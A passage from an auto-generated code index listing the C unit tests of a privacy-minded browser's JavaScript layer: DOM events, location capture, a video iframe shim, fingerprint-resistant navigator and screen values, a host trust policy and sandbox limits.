- `test_element_has_attribute` (line 474) `static void test_element_has_attribute(void **state)`
- `test_element_remove_attribute` (line 480) `static void test_element_remove_attribute(void **state)`
- `test_element_src_href_are_strings` (line 490) `static void test_element_src_href_are_strings(void **state)`
- `test_append_cycle_is_rejected` (line 498) `static void test_append_cycle_is_rejected(void **state)`
- `test_onload_runs_and_mutates` (line 506) `static void test_onload_runs_and_mutates(void **state)`
- `assert_int_equal` (line 511) `assert_int_equal(run(f,
        "window.onload=function()`
- `test_settimeout_flushed_by_pump` (line 519) `static void test_settimeout_flushed_by_pump(void **state)`
- `EXPECT` (line 522) `EXPECT(f,
        "setTimeout(function()`
- `test_inner_html_builds_and_queryable` (line 527) `static void test_inner_html_builds_and_queryable(void **state)`
- `test_inner_html_getter_serializes` (line 538) `static void test_inner_html_getter_serializes(void **state)` - *"var b=document.getElementById('go').textContent; __fireDeferred();" "b+'/'+document.getElementById('go').textContent", "Go/timed"); } static void test_inner_html_builds_and_queryable(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "document.getElementById('main').innerHTML='<p id=\"ih\">hi</p>';" "document.getElementById('ih').textContent", "hi"); dom_node_id ih = dom_get_element_by_id(f->idx, "ih"); assert_int_not_equal(ih, DOM_NODE_NONE); } /* innerHTML GETTER (2026-07-11): serializes the node's children back to markup.*
- `test_storage_is_ephemeral` (line 548) `static void test_storage_is_ephemeral(void **state)` - *assert_int_not_equal(ih, DOM_NODE_NONE); } /* innerHTML GETTER (2026-07-11): serializes the node's children back to markup. static void test_inner_html_getter_serializes(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "document.getElementById('main').innerHTML='<p id=\"gh\">hi</p>';" "document.getElementById('main').innerHTML", "<p id=\"gh\">hi</p>"); /* a text-only child serializes as its text EXPECT(f, "document.getElementById('gh').innerHTML", "hi"); } /* Identity-safe ambient globals: present (no throws) but leak nothing.*
- `test_cookie_and_referrer_leak_nothing` (line 554) `static void test_cookie_and_referrer_leak_nothing(void **state)`
- `persisted` (line 569) `* never persisted (process-lifetime only). */
static void test_cookie_jar_enabled_for_trusted_hos...`
- `test_ambient_apis_do_not_throw` (line 593) `static void test_ambient_apis_do_not_throw(void **state)`
- `set_https_location` (line 605) `static void set_https_location(fixture *f, const char *url)` - *assert_null(strstr(buf, "theme=")); } static void test_ambient_apis_do_not_throw(void **state) { fixture *f = (fixture *)*state; /* history/location stubs let detection scripts run without ReferenceErrors. EXPECT(f, "history.pushState({},'',''); location.assign('x'); location.replace('y');" "typeof history.pushState + typeof location.protocol", "functionstring"); } /* --- real location + JS navigation capture (Hito 20e parte 1) --- /* Installs a real https location on the fixture context from url.*
- `test_location_reads_real_components` (line 610) `static void test_location_reads_real_components(void **state)`
- `test_location_pathname_defaults_slash` (line 627) `static void test_location_pathname_defaults_slash(void **state)`
- `test_location_href_set_captures_raw` (line 635) `static void test_location_href_set_captures_raw(void **state)`
- `test_location_replace_sets_replace_flag` (line 649) `static void test_location_replace_sets_replace_flag(void **state)`
- `test_location_assign_and_window_last_wins` (line 661) `static void test_location_assign_and_window_last_wins(void **state)`
- `test_no_nav_request_when_idle` (line 673) `static void test_no_nav_request_when_idle(void **state)`
- `test_local_page_captures_nav` (line 683) `static void test_local_page_captures_nav(void **state)` - *A local (file) page has no https parts but still captures navigation requests, * so the parent can resolve them against the file base.*
- `test_set_location_null_ctx` (line 694) `static void test_set_location_null_ctx(void **state)`
- `console_fixture` (line 705) `static void console_fixture(hp_document **doc, dom_index **idx, js_context **ctx,
               ...` - *assert_int_equal(jd_take_nav_request(f->ctx, buf, sizeof buf, &replace), 1); assert_string_equal(buf, "sub.html"); } static void test_set_location_null_ctx(void **state) { (void)state; char buf[8]; int replace = 0; assert_int_equal(jd_set_location(NULL, "https://x", NULL), JD_ERR_NULL_ARG); assert_int_equal(jd_take_nav_request(NULL, buf, sizeof buf, &replace), 0); } /* --- capturing console (Freebug) --- /* Builds a fresh context with dom + capturing console wired to *log.*
- `console_teardown` (line 715) `static void console_teardown(hp_document *doc, dom_index *idx, js_context *ctx,
                 ...`
- `test_console_captures_levels` (line 723) `static void test_console_captures_levels(void **state)`
- `test_console_object_and_throwing_tostring` (line 750) `static void test_console_object_and_throwing_tostring(void **state)`
- `test_console_null_buffer_is_noop` (line 772) `static void test_console_null_buffer_is_noop(void **state)`
- `test_console_null_ctx` (line 793) `static void test_console_null_ctx(void **state)`
- `test_event_add_event_listener_fires` (line 802) `static void test_event_add_event_listener_fires(void **state)` - *js_context_free(ctx); dom_free(idx); hp_document_free(doc); } static void test_console_null_ctx(void **state) { (void)state; fb_buffer log; fb_buffer_init(&log); assert_int_equal(jd_install_console(NULL, &log), JD_ERR_NULL_ARG); fb_buffer_free(&log); } /* --- generic events (Phase 1.1 dispatcher) ---*
- `test_event_onkeydown_fires` (line 820) `static void test_event_onkeydown_fires(void **state)`
- `test_event_input_handler_fires_with_value` (line 838) `static void test_event_input_handler_fires_with_value(void **state)`
- `test_event_prevent_default_suppresses` (line 856) `static void test_event_prevent_default_suppresses(void **state)`
- `test_event_no_handler_allows_default` (line 873) `static void test_event_no_handler_allows_default(void **state)`
- `test_event_null_args` (line 880) `static void test_event_null_args(void **state)`
- `test_focus_add_event_listener_fires` (line 893) `static void test_focus_add_event_listener_fires(void **state)` - *} static void test_event_null_args(void **state) { (void)state; fixture *f = (fixture *)*state; assert_int_equal(jd_fire_event(NULL, (dom_node_id)1, "keydown", "x", 88, NULL), 1); assert_int_equal(jd_fire_event(f->ctx, DOM_NODE_NONE, "keydown", "x", 88, NULL), 1); assert_int_equal(jd_fire_event(f->ctx, (dom_node_id)1, NULL, "x", 88, NULL), 1); } /* --- focus/blur/scroll events (Phase 1.3 dispatcher) --- /* Registers a focus listener via addEventListener and fires it.*
- `test_blur_onblur_fires` (line 910) `static void test_blur_onblur_fires(void **state)` - *"var i = document.getElementsByTagName('input')[0];" "i.addEventListener('focus', function(e){" "  i.value = 'focused';" "}); i._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_event(f->ctx, h, "focus", NULL, 0, NULL), 0); EXPECT(f, "document.getElementsByTagName('input')[0].value", "focused"); } /* Registers an onblur handler via property setter and fires it.*
- `test_scroll_add_event_listener_fires` (line 926) `static void test_scroll_add_event_listener_fires(void **state)` - *const char *src = "var i = document.getElementsByTagName('input')[0];" "i.onblur = function(e){ i.value = 'lost'; };" "i._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_event(f->ctx, h, "blur", NULL, 0, NULL), 0); EXPECT(f, "document.getElementsByTagName('input')[0].value", "lost"); } /* Registers a scroll listener via addEventListener and fires it.*
- `test_scroll_onscroll_fires` (line 943) `static void test_scroll_onscroll_fires(void **state)` - *"var p = document.getElementById('main');" "p.addEventListener('scroll', function(e){" "  p.textContent = 'scrolled';" "}); p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_event(f->ctx, h, "scroll", NULL, 0, NULL), 0); EXPECT(f, "document.getElementById('main').textContent", "scrolled"); } /* Registers an onscroll handler via property setter and fires it.*
- `test_focus_blur_scroll_prevent_default` (line 959) `static void test_focus_blur_scroll_prevent_default(void **state)` - *const char *src = "var p = document.getElementById('main');" "p.onscroll = function(e){ p.textContent = 's'; };" "p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_event(f->ctx, h, "scroll", NULL, 0, NULL), 0); EXPECT(f, "document.getElementById('main').textContent", "s"); } /* preventDefault on focus/blur/scroll.*
- `test_focus_blur_scroll_no_handler_allows_default` (line 987) `static void test_focus_blur_scroll_no_handler_allows_default(void **state)` - */* scroll on a different element that has a scroll handler. const char *src2 = "var p = document.getElementById('main');" "p.addEventListener('scroll', function(e){ e.preventDefault(); });" "p._h;"; assert_int_equal(js_eval(f->ctx, src2, strlen(src2), &r), JS_OK); dom_node_id h2 = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h2, DOM_NODE_NONE); assert_int_equal(jd_fire_event(f->ctx, h2, "scroll", NULL, 0, NULL), 0); } /* No handler = default action allowed.*
- `test_focus_blur_scroll_null_args` (line 995) `static void test_focus_blur_scroll_null_args(void **state)` - *js_result_free(&r); assert_int_not_equal(h2, DOM_NODE_NONE); assert_int_equal(jd_fire_event(f->ctx, h2, "scroll", NULL, 0, NULL), 0); } /* No handler = default action allowed. static void test_focus_blur_scroll_no_handler_allows_default(void **state) { fixture *f = (fixture *)*state; assert_int_equal(jd_fire_event(f->ctx, (dom_node_id)1, "focus", NULL, 0, NULL), 1); assert_int_equal(jd_fire_event(f->ctx, (dom_node_id)1, "blur", NULL, 0, NULL), 1); assert_int_equal(jd_fire_event(f->ctx, (dom_node_id)1, "scroll", NULL, 0, NULL), 1); } /* Null args.*
- `test_mouse_add_event_listener_fires` (line 1005) `static void test_mouse_add_event_listener_fires(void **state)` - *assert_int_equal(jd_fire_event(f->ctx, (dom_node_id)1, "scroll", NULL, 0, NULL), 1); } /* Null args. static void test_focus_blur_scroll_null_args(void **state) { fixture *f = (fixture *)*state; assert_int_equal(jd_fire_event(NULL, (dom_node_id)1, "focus", NULL, 0, NULL), 1); assert_int_equal(jd_fire_event(f->ctx, DOM_NODE_NONE, "focus", NULL, 0, NULL), 1); assert_int_equal(jd_fire_event(f->ctx, (dom_node_id)1, NULL, NULL, 0, NULL), 1); } /* --- mouse events (Phase 1.2 dispatcher) --- /* Registers a mouseover listener via addEventListener and fires it.*
- `test_mouse_onmouseout_fires` (line 1022) `static void test_mouse_onmouseout_fires(void **state)` - *"var p = document.getElementById('main');" "p.addEventListener('mouseover', function(e){" "  p.textContent = 'over';" "}); p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_mouse_event(f->ctx, h, "mouseover", 100, 200, 0), 0); EXPECT(f, "document.getElementById('main').textContent", "over"); } /* Registers an onmouseout handler via property setter and fires it.*
- `test_mouse_mousemove_sees_coords` (line 1038) `static void test_mouse_mousemove_sees_coords(void **state)` - *const char *src = "var p = document.getElementById('main');" "p.onmouseout = function(e){ p.textContent = 'out'; };" "p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_mouse_event(f->ctx, h, "mouseout", 150, 250, -1), 0); EXPECT(f, "document.getElementById('main').textContent", "out"); } /* Fires a mousemove event with coordinates and verifies the handler sees them.*
- `test_mouse_multi_event_fires` (line 1055) `static void test_mouse_multi_event_fires(void **state)` - *"var p = document.getElementById('main');" "p.addEventListener('mousemove', function(e){" "  p.textContent = e.clientX + ',' + e.clientY;" "}); p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_not_equal(jd_fire_mouse_event(f->ctx, h, "mousemove", 42, 73, 0), 0); EXPECT(f, "document.getElementById('main').textContent", "42,73"); } /* Fires on multiple mouse event types and verifies each triggers separately.*
- `test_mouse_prevent_default_suppresses` (line 1089) `static void test_mouse_prevent_default_suppresses(void **state)` - *EXPECT(f, "n", "1"); (void)jd_fire_mouse_event(f->ctx, h, "mouseout", 0, 0, 0); EXPECT(f, "n", "11"); (void)jd_fire_mouse_event(f->ctx, h, "mousemove", 0, 0, 0); EXPECT(f, "n", "111"); (void)jd_fire_mouse_event(f->ctx, h, "mouseenter", 0, 0, 0); EXPECT(f, "n", "1111"); (void)jd_fire_mouse_event(f->ctx, h, "mouseleave", 0, 0, 0); EXPECT(f, "n", "11111"); (void)jd_fire_mouse_event(f->ctx, h, "wheel", 0, 0, -1); EXPECT(f, "n", "111111"); } /* preventDefault on a mouse event suppresses the default action.*
- `test_mouse_no_handler_allows_default` (line 1105) `static void test_mouse_no_handler_allows_default(void **state)` - *const char *src = "var p = document.getElementById('main');" "p.addEventListener('mousedown', function(e){ e.preventDefault(); });" "p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); int def = jd_fire_mouse_event(f->ctx, h, "mousedown", 10, 20, 0); assert_int_equal(def, 0); } /* No handler = default action allowed.*
- `test_mouse_null_args` (line 1112) `static void test_mouse_null_args(void **state)` - *js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); int def = jd_fire_mouse_event(f->ctx, h, "mousedown", 10, 20, 0); assert_int_equal(def, 0); } /* No handler = default action allowed. static void test_mouse_no_handler_allows_default(void **state) { fixture *f = (fixture *)*state; int def = jd_fire_mouse_event(f->ctx, (dom_node_id)1, "mouseover", 5, 10, 0); assert_int_equal(def, 1); } /* Null arguments are fail-open.*
- `test_click_install_null_args` (line 1120) `static void test_click_install_null_args(void **state)` - *fixture *f = (fixture *)*state; int def = jd_fire_mouse_event(f->ctx, (dom_node_id)1, "mouseover", 5, 10, 0); assert_int_equal(def, 1); } /* Null arguments are fail-open. static void test_mouse_null_args(void **state) { fixture *f = (fixture *)*state; assert_int_equal(jd_fire_mouse_event(NULL, (dom_node_id)1, "mouseover", 0, 0, 0), 1); assert_int_equal(jd_fire_mouse_event(f->ctx, DOM_NODE_NONE, "mouseover", 0, 0, 0), 1); assert_int_equal(jd_fire_mouse_event(f->ctx, (dom_node_id)1, NULL, 0, 0, 0), 1); } /* --- click events (Stage 4 dispatcher) ---*
- `test_click_add_event_listener_fires` (line 1127) `static void test_click_add_event_listener_fires(void **state)` - *fixture *f = (fixture *)*state; assert_int_equal(jd_fire_mouse_event(NULL, (dom_node_id)1, "mouseover", 0, 0, 0), 1); assert_int_equal(jd_fire_mouse_event(f->ctx, DOM_NODE_NONE, "mouseover", 0, 0, 0), 1); assert_int_equal(jd_fire_mouse_event(f->ctx, (dom_node_id)1, NULL, 0, 0, 0), 1); } /* --- click events (Stage 4 dispatcher) --- static void test_click_install_null_args(void **state) { (void)state; assert_int_equal(jd_install_events(NULL, NULL), JD_ERR_NULL_ARG); } /* Registers a click listener on a paragraph and fires it from native code.*
- `test_click_onclick_fires` (line 1151) `static void test_click_onclick_fires(void **state)` - *"p._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_equal(jd_fire_click(f->ctx, h), 1); /* default action allowed EXPECT(f, "document.getElementsByTagName('p')[0].textContent", "clicked"); jd_click_state_free(cs); } /* onclick property also registers a handler.*
- `test_click_prevent_default` (line 1175) `static void test_click_prevent_default(void **state)` - *"b._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_equal(jd_fire_click(f->ctx, h), 1); EXPECT(f, "document.getElementById('go').textContent", "fired"); jd_click_state_free(cs); } /* preventDefault() stops the default action.*
- `test_click_no_handler_allows_default` (line 1198) `static void test_click_no_handler_allows_default(void **state)` - *"b.onclick = function(e){ e.preventDefault(); b.textContent = 'prevented'; };" "b._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_equal(jd_fire_click(f->ctx, h), 0); /* default action cancelled EXPECT(f, "document.getElementById('go').textContent", "prevented"); jd_click_state_free(cs); } /* No handler registered => default action allowed, no mutation.*
- `test_submit_add_event_listener_fires` (line 1212) `static void test_submit_add_event_listener_fires(void **state)` - *static void test_click_no_handler_allows_default(void **state) { (void)state; fixture *f = (fixture *)*state; jd_click_state *cs = jd_click_state_new(); assert_non_null(cs); assert_int_equal(jd_install_events(f->ctx, cs), JD_OK); assert_int_equal(jd_fire_click(f->ctx, 9999), 1); jd_click_state_free(cs); } /* --- submit events --- /* Registers a submit listener via addEventListener and fires it.*
- `test_submit_onsubmit_fires` (line 1231) `static void test_submit_onsubmit_fires(void **state)` - *"var fm = document.getElementById('frm');" "fm.addEventListener('submit', function(e){ fm._submitted = true; });" "fm._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_equal(jd_fire_submit(f->ctx, h), 1); /* default action allowed EXPECT(f, "document.getElementById('frm')._submitted", "true"); } /* onsubmit property also registers a handler.*
- `test_submit_prevent_default` (line 1250) `static void test_submit_prevent_default(void **state)` - *"var fm = document.getElementById('frm');" "fm.onsubmit = function(e){ fm._submitted = true; };" "fm._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_equal(jd_fire_submit(f->ctx, h), 1); EXPECT(f, "document.getElementById('frm')._submitted", "true"); } /* preventDefault() stops the default action.*
- `test_submit_no_handler_allows_default` (line 1269) `static void test_submit_no_handler_allows_default(void **state)` - *"var fm = document.getElementById('frm');" "fm.onsubmit = function(e){ e.preventDefault(); fm._prevented = true; };" "fm._h;"; js_result r; assert_int_equal(js_eval(f->ctx, src, strlen(src), &r), JS_OK); dom_node_id h = (dom_node_id)strtoull(r.value, NULL, 10); js_result_free(&r); assert_int_not_equal(h, DOM_NODE_NONE); assert_int_equal(jd_fire_submit(f->ctx, h), 0); /* default action cancelled EXPECT(f, "document.getElementById('frm')._prevented", "true"); } /* No handler registered => default action proceeds.*
- `test_video_shim_no_video` (line 1279) `static void test_video_shim_no_video(void **state)` - *EXPECT(f, "document.getElementById('frm')._prevented", "true"); } /* No handler registered => default action proceeds. static void test_submit_no_handler_allows_default(void **state) { (void)state; fixture *f = (fixture *)*state; assert_int_equal(jd_fire_submit(f->ctx, 9999), 1); } /* --- video shim --- /* No `video` variable defined: shim is a no-op, no iframe created.*
- `test_video_shim_uses_index_1` (line 1287) `static void test_video_shim_uses_index_1(void **state)` - *`video[0..2]` defined with absolute iframe src: shim creates iframe from * video[1] (default provider, Magi), ignoring video[0] (Desu).*
- `test_video_shim_video_data_wins` (line 1311) `static void test_video_shim_video_data_wins(void **state)` - *`video_data` (prepared by the page) takes precedence over `video[]`: when * both exist, the shim creates an iframe from video_data, not video[1].*
- `test_video_shim_relative_url_resolved` (line 1335) `static void test_video_shim_relative_url_resolved(void **state)` - *`video_data` with relative src gets resolved against location.protocol and * location.hostname. Only for relative URLs starting with '/'.*
- `test_video_shim_empty_html` (line 1353) `static void test_video_shim_empty_html(void **state)` - *assert_int_equal(js_eval(f->ctx, "var video_data = '<iframe src=\"/jkplayer/umv?e=abc\"></iframe>';", strlen("var video_data = '<iframe src=\"/jkplayer/umv?e=abc\"></iframe>';"), &r), JS_OK); js_result_free(&r); assert_int_equal(jd_inject_video_shim(f->ctx), JD_OK); dom_node_id ids[2]; assert_int_equal(dom_get_by_tag(f->idx, "iframe", ids, 2), 1); size_t slen = 0; const char *src = dom_get_attribute(f->idx, ids[0], "src", &slen); assert_non_null(src); assert_string_equal(src, "https://anime.test/jkplayer/umv?e=abc"); } /* `video[1]` is empty string: no iframe created.*
- `test_video_shim_null_ctx` (line 1365) `static void test_video_shim_null_ctx(void **state)` - */* `video[1]` is empty string: no iframe created. static void test_video_shim_empty_html(void **state) { fixture *f = (fixture *)*state; js_result r; assert_int_equal(js_eval(f->ctx, "var video = []; video[1] = '';", strlen("var video = []; video[1] = '';"), &r), JS_OK); js_result_free(&r); assert_int_equal(jd_inject_video_shim(f->ctx), JD_OK); assert_int_equal(dom_get_by_tag(f->idx, "iframe", NULL, 0), 0); } /* NULL context returns JD_ERR_NULL_ARG.*
- `main` (line 1369) `int main(void)`

**Macros:**
- `EXPECT` (line 72)

**Structs:**
- `fixture` (line 38)

#### `test_js_env.c`
**Path:** `tests/test_js_env.c`

**Functions:**
- `setup` (line 28) `static int setup(void **state)`
- `teardown` (line 37) `static int teardown(void **state)`
- `run` (line 46) `static js_status run(fixture *f, const char *src, js_result *r)`
- `test_install_null_args` (line 61) `static void test_install_null_args(void **state)` - *static js_status run(fixture *f, const char *src, js_result *r) { return js_eval(f->ctx, src, strlen(src), r); } #define EXPECT(f, src, expected)                                   \ do {                                                           \ js_result _r;                                              \ assert_int_equal(run((f), (src), &_r), JS_OK);             \ assert_non_null(_r.value);                                 \ assert_string_equal(_r.value, (expected));                 \ js_result_free(&_r);                                       \ } while (0) /* --- install ---*
- `test_navigator_identity` (line 73) `static void test_navigator_identity(void **state)` - */* --- install --- static void test_install_null_args(void **state) { (void)state; assert_int_equal(je_install(NULL, 1920, 1080), JE_ERR_NULL_ARG); js_context *ctx = NULL; assert_int_equal(js_context_new(NULL, &ctx), JS_OK); assert_int_equal(je_install(ctx, 1920, 1080), JE_OK); js_context_free(ctx); } /* --- normalized identity ---*
- `test_legacy_nav_props` (line 91) `static void test_legacy_nav_props(void **state)` - *EXPECT(f, "navigator.userAgent.length > 0", "true"); EXPECT(f, "navigator.language", "en-US"); EXPECT(f, "navigator.languages.length", "2"); EXPECT(f, "navigator.languages[0]", "en-US"); EXPECT(f, "navigator.languages[1]", "en"); EXPECT(f, "navigator.platform", "Linux x86_64"); EXPECT(f, "navigator.vendor === ''", "true"); EXPECT(f, "navigator.hardwareConcurrency", "2"); EXPECT(f, "navigator.deviceMemory", "8"); EXPECT(f, "navigator.webdriver", "false"); EXPECT(f, "navigator.doNotTrack === null", "true"); } /* --- legacy navigator properties (Hito 30b) ---*
- `test_bool_nav_props` (line 102) `static void test_bool_nav_props(void **state)`
- `test_navigator_plugins` (line 111) `static void test_navigator_plugins(void **state)` - *EXPECT(f, "navigator.productSub", "20100101"); EXPECT(f, "navigator.oscpu", "Linux x86_64"); EXPECT(f, "navigator.appVersion.length > 0", "true"); EXPECT(f, "navigator.buildID.length > 0", "true"); } static void test_bool_nav_props(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "navigator.maxTouchPoints", "0"); EXPECT(f, "navigator.onLine", "true"); EXPECT(f, "navigator.cookieEnabled", "true"); } /* --- plugins and mimeTypes (Hito 30b) ---*
- `test_navigator_mime_types` (line 119) `static void test_navigator_mime_types(void **state)`
- `test_crypto_present` (line 128) `static void test_crypto_present(void **state)` - *EXPECT(f, "navigator.plugins.length > 0", "true"); EXPECT(f, "navigator.plugins[0].name.length > 0", "true"); EXPECT(f, "navigator.plugins[0].filename.length > 0", "true"); EXPECT(f, "typeof navigator.plugins.refresh", "function"); } static void test_navigator_mime_types(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "navigator.mimeTypes.length >= 2", "true"); EXPECT(f, "navigator.mimeTypes[0].type === 'application/pdf'", "true"); EXPECT(f, "navigator.mimeTypes[0].suffixes === 'pdf'", "true"); } /* --- crypto (Hito 30b) ---*
- `test_crypto_random_uuid` (line 136) `static void test_crypto_random_uuid(void **state)`
- `test_crypto_random_values` (line 145) `static void test_crypto_random_values(void **state)`
- `test_screen_orientation` (line 155) `static void test_screen_orientation(void **state)` - *EXPECT(f, "var u=crypto.randomUUID(); u.charAt(14)==='4'?'v4':'not-v4'", "v4"); EXPECT(f, "var a=crypto.randomUUID(),b=crypto.randomUUID(); a!==b?'distinct':'equal'", "distinct"); } static void test_crypto_random_values(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "var a=new Uint8Array(32); crypto.getRandomValues(a);" "var z=0;for(var i=0;i<32;i++)z|=a[i]; z>0?'filled':'empty'", "filled"); EXPECT(f, "var a=new Uint32Array(4); var b=crypto.getRandomValues(a);" "a===b?'returned-same':'different'", "returned-same"); } /* --- screen orientation (Hito 30b) ---*
- `test_screen_bucketed` (line 165) `static void test_screen_bucketed(void **state)` - *"a===b?'returned-same':'different'", "returned-same"); } /* --- screen orientation (Hito 30b) --- static void test_screen_orientation(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "typeof screen.orientation", "object"); EXPECT(f, "screen.orientation.type", "landscape-primary"); EXPECT(f, "screen.orientation.angle", "0"); EXPECT(f, "typeof screen.orientation.addEventListener", "function"); } /* --- screen bucketing: real (1680,1050) snaps to 1600x900 ---*
- `test_clocks_coarse` (line 177) `static void test_clocks_coarse(void **state)` - */* --- screen bucketing: real (1680,1050) snaps to 1600x900 --- static void test_screen_bucketed(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "screen.width", "1600"); EXPECT(f, "screen.height", "900"); EXPECT(f, "screen.availWidth === screen.width", "true"); EXPECT(f, "screen.availHeight === screen.height", "true"); EXPECT(f, "screen.colorDepth", "24"); EXPECT(f, "screen.pixelDepth", "24"); } /* --- coarse clocks ---*
- `test_performance_timing_identity_safe` (line 190) `static void test_performance_timing_identity_safe(void **state)` - *performance.timing / navigation / getEntries*: present (real analytics read them) and identity-safe -- every timing field is the same fixed epoch (deltas are 0), * entry lists are empty, so no real navigation timing leaks.*
- `test_unforgeable` (line 205) `static void test_unforgeable(void **state)` - *fixture *f = (fixture *)*state; EXPECT(f, "typeof performance.timing", "object"); EXPECT(f, "performance.timing.responseStart - performance.timing.navigationStart", "0"); EXPECT(f, "performance.timing.loadEventEnd - performance.timing.navigationStart", "0"); EXPECT(f, "typeof performance.timeOrigin", "number"); EXPECT(f, "performance.navigation.type", "0"); EXPECT(f, "performance.getEntriesByType('navigation').length", "0"); EXPECT(f, "typeof performance.mark", "function"); /* Sealed: a script cannot add or replace fields. EXPECT(f, "try{performance.timing.responseStart=5}catch(e){};" "performance.timing.responseStart === performance.timing.navigationStart", "true"); } /* --- the API cannot be hijacked ---*
- `test_screen_edges` (line 219) `static void test_screen_edges(void **state)` - *static void test_unforgeable(void **state) { fixture *f = (fixture *)*state; EXPECT(f, "try{navigator.userAgent='x'}catch(e){};" "navigator.userAgent.indexOf('Firefox') >= 0", "true"); EXPECT(f, "try{navigator.injected=1}catch(e){}; typeof navigator.injected", "undefined"); EXPECT(f, "try{screen.width=10}catch(e){}; screen.width", "1600"); /* Date.now cannot be restored to a high-resolution real clock. EXPECT(f, "try{Date.now=function(){return 12345}}catch(e){}; Date.now()%100", "0"); } /* --- screen edge cases never crash, fall to smallest bucket ---*
- `test_canvas_readback` (line 238) `static void test_canvas_readback(void **state)` - *assert_int_equal(je_install(ctx, 0, 0), JE_OK); js_result r; const char *probe = "screen.width > 0"; assert_int_equal(js_eval(ctx, probe, strlen(probe), &r), JS_OK); assert_string_equal(r.value, "true"); js_result_free(&r); js_context_free(ctx); assert_int_equal(js_context_new(NULL, &ctx), JS_OK); assert_int_equal(je_install(ctx, -1, -1), JE_OK); js_context_free(ctx); } /* --- canvas/audio readback poisoning (fp_perturb) ---*
- `readback_checksum` (line 279) `static void readback_checksum(uint64_t key, char *out, size_t out_size)` - *assert_int_equal(js_eval(ctx, det, strlen(det), &r), JS_OK); assert_string_equal(r.value, "true"); js_result_free(&r); /* audio shares the same poisoning seam. const char *au = "typeof audio.readback"; assert_int_equal(js_eval(ctx, au, strlen(au), &r), JS_OK); assert_string_equal(r.value, "function"); js_result_free(&r); js_context_free(ctx); } /* checksum of a fixed perturbed readback, for cross-session comparison.*
- `test_canvas_unlinkable` (line 294) `static void test_canvas_unlinkable(void **state)`
- `test_canvas_unforgeable` (line 302) `static void test_canvas_unforgeable(void **state)`
- `test_coexists_with_dom` (line 325) `static void test_coexists_with_dom(void **state)`
- `main` (line 354) `int main(void)`

**Macros:**
- `EXPECT` (line 50)

**Structs:**
- `fixture` (line 25)

#### `test_js_policy.c`
**Path:** `tests/test_js_policy.c`

**Functions:**
- `test_enabled_fail_closed_on_bad_mode` (line 30) `static void test_enabled_fail_closed_on_bad_mode(void **state)`
- `test_mode_from_str` (line 35) `static void test_mode_from_str(void **state)`
- `test_mode_str_roundtrip` (line 52) `static void test_mode_str_roundtrip(void **state)`
- `test_trusted_requires_both_signals` (line 68) `static void test_trusted_requires_both_signals(void **state)` - *Hito 28: a host is TRUSTED (full author CSS + images, on top of full JS) only when the user declared it twice: JS enabled for it AND explicitly on allow.conf. * Either signal alone must fail closed.*
- `main` (line 88) `int main(void)`

#### `test_js_sandbox.c`
**Path:** `tests/test_js_sandbox.c`

**Functions:**
- `test_validate_rejects_null` (line 33) `static void test_validate_rejects_null(void **state)` - *#include "js_sandbox.h" /* --- js_limits_default --- static void test_limits_default_is_secure(void **state) { (void)state; js_limits l = js_limits_default(); assert_true(l.max_source_bytes > 0); assert_true(l.memory_limit_bytes > 0); assert_true(l.max_stack_bytes > 0); assert_true(l.time_budget_ms > 0); } /* --- js_validate_source ---*
